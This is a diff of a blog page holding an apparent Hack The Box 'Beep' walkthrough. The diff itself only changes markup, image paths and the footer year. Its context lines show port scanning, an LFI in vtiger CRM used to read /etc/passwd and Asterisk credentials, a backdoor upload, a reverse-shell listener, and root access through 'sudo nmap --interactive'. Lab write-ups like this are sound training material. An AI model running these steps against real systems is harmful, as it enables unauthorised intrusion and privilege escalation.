@@ -106,7 +106,7 @@
 
 <p>Let’s run nmap to see which services are running on the machine:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nmap -sT -sV -p 1-65535 10.10.10.7 -A
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nmap -sT -sV -p 1-65535 10.10.10.7 -A
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-08 12:27 EST
 Nmap scan report for beep.localdomain (10.10.10.7)
@@ -136,11 +136,11 @@ Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: U
 
 <p>On port 443 there was Apache with elastix:</p>
 
-<p><img src="/images/posts/2018/2018-01-08-htb-beep/img1.png" alt="Screenshot" /></p>
+<p><img src="/images/2018-01-08-htb-beep/img1.png" alt="Screenshot" /></p>
 
 <p>By using dirsearch I enumerated it’s directories:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/usr/share/wordlists/SecLists/Discovery/Web_Content# dirsearch -u https://10.10.10.7/ -w raft-medium-directories.txt -e php,txt
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/usr/share/wordlists/SecLists/Discovery/Web_Content# dirsearch -u https://10.10.10.7/ -w raft-medium-directories.txt -e php,txt
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -171,20 +171,20 @@ Target: https://10.10.10.7/
 
 <p>I found vtigercrm 5.1.0:</p>
 
-<p><img src="/images/posts/2018/2018-01-08-htb-beep/img2.png" alt="Screenshot" /></p>
+<p><img src="/images/2018-01-08-htb-beep/img2.png" alt="Screenshot" /></p>
 
 <p>This version is vulnerable to LFI.
 With <a href="https://github.com/dzonerzy/goWAPT">goWAPT</a> I enumerated all the files:</p>
 
-<p><img src="/images/posts/2018/2018-01-08-htb-beep/img3.png" alt="Screenshot" /></p>
+<p><img src="/images/2018-01-08-htb-beep/img3.png" alt="Screenshot" /></p>
 
 <p>In the /etc/passwd file we can see the user Fanis:</p>
 
-<p><img src="/images/posts/2018/2018-01-08-htb-beep/img4.png" alt="Screenshot" /></p>
+<p><img src="/images/2018-01-08-htb-beep/img4.png" alt="Screenshot" /></p>
 
 <p>After some research on google about asterisk, I got the etc/asterisk/manager.conf file:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>;
 ; AMI - Asterisk Manager interface
 ;
 ; FreePBX needs this to be enabled. Note that if you enable it on a different IP, you need
@@ -216,11 +216,11 @@ write = system,call,log,verbose,command,agent,user,config,command,dtmf,reporting
 
 <p>After some research on Google, I was able to upload a backdoor by using this <a href="https://www.exploit-db.com/exploits/38345/">vulnerability</a> in vtiger crm:</p>
 
-<p><img src="/images/posts/2018/2018-01-08-htb-beep/img5.png" alt="Screenshot" /></p>
+<p><img src="/images/2018-01-08-htb-beep/img5.png" alt="Screenshot" /></p>
 
 <p>With python I got a reverse shell and the user flag:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/webshell# nc -lvp 80
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/webshell# nc -lvp 80
 listening on [any] 80 ...
 connect to [10.10.14.6] from beep.localdomain [10.10.10.7] 46497
 sh: no job control in this shell
@@ -236,7 +236,7 @@ cat /home/fanis/user.txt
 
 <p>There were different ways to get the root flag:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-3.2$ sudo -l
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-3.2$ sudo -l
 sudo -l
 Matching Defaults entries for asterisk on this host:
     env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
@@ -270,7 +270,7 @@ bash-3.2$ cat /root/root.txt
 cat /root/root.txt
 </code></pre></div></div>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-3.2$ sudo nmap --interactive
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-3.2$ sudo nmap --interactive
 sudo nmap --interactive
 
 Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
@@ -324,7 +324,7 @@ nmap&gt;
         <div class="row">
   <div class="col-lg-8 col-lg-offset-2">
     <footer>
-      Syrion © 2018 
+      Syrion © 2020 
     </footer>
   </div>
 </div>
